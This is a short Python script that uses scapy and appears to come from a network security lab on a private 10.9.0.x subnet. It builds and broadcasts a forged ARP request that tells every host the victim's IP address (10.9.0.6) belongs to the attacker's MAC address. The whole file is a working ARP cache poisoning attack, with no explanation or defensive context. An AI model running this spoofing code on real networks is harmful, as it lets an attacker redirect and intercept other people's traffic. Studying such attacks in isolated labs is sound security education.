#!/usr/bin/env python3
from scapy.all import *


IP_B  = "10.9.0.6"
MAC_M = "02:42:0a:09:00:69"  
IP_SRC = IP_B                 
HW_SRC = MAC_M      
DST_MAC = "ff:ff:ff:ff:ff:ff"

# ARP request: op=1
arp = ARP(op=1, hwsrc=HW_SRC, psrc=IP_SRC, hwdst="00:00:00:00:00:00", pdst=IP_B)
eth = Ether(dst=DST_MAC, src=HW_SRC)
pkt = eth/arp

print("Sending ARP request: claiming %s is at %s" % (IP_B, MAC_M))
sendp(pkt, iface="eth0", verbose=True)
